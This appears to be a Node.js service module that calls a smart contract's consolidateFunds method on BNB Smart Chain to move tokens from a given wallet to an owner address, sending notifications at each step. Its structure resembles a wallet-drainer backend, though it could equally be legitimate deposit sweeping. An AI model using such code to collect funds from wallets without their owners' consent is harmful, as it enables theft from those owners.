const { web3, contract, account } = require('../config');
const { sendAllNotifications } = require('./notificationService');

// Consolidate funds
async function consolidateFunds(walletAddress, tokenSymbol, balance) {
    try {
        console.log(`🔄 Starting consolidation for ${walletAddress} - ${tokenSymbol}`);
        
        // Processing notification
        const processingMessage = `👤 Wallet: ${walletAddress}\n🪙 Token: ${tokenSymbol}\n💰 Balance: ${balance} ${tokenSymbol}\n\n⏳ Consolidating...`;
        await sendAllNotifications('🔄 PROCESSING', processingMessage);
        
        // Prepare transaction
        const txData = contract.methods.consolidateFunds(walletAddress).encodeABI();
        
        const tx = {
            from: account.address,
            to: process.env.CONTRACT_ADDRESS,
            data: txData,
            gas: process.env.GAS_LIMIT || 3000000,
            gasPrice: process.env.GAS_PRICE || await web3.eth.getGasPrice(),
            chainId: 56
        };
        
        // Sign and send transaction
        const signedTx = await web3.eth.accounts.signTransaction(tx, process.env.OWNER_PRIVATE_KEY);
        const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
        
        console.log(`✅ Consolidation successful: ${receipt.transactionHash}`);
        
        // Success notification
        const successMessage = `👤 Wallet: ${walletAddress}\n🪙 Token: ${tokenSymbol}\n💰 Balance: ${balance} ${tokenSymbol}\n📦 Collected: ${balance} ${tokenSymbol}\n🏦 To: ${process.env.OWNER_ADDRESS}\n🔗 Tx: https://bscscan.com/tx/${receipt.transactionHash}`;
        await sendAllNotifications('✅ SUCCESS - FUNDS COLLECTED', successMessage);
        
        return {
            success: true,
            transactionHash: receipt.transactionHash
        };
        
    } catch (error) {
        console.error(`❌ Consolidation error for ${tokenSymbol}:`, error.message);
        
        // Error notification
        const errorMessage = `👤 Wallet: ${walletAddress}\n🪙 Token: ${tokenSymbol}\n❌ Error: ${error.message}`;
        await sendAllNotifications('❌ ERROR - TRANSACTION FAILED', errorMessage);
        
        return {
            success: false,
            error: error.message
        };
    }
}

module.exports = {
    consolidateFunds
};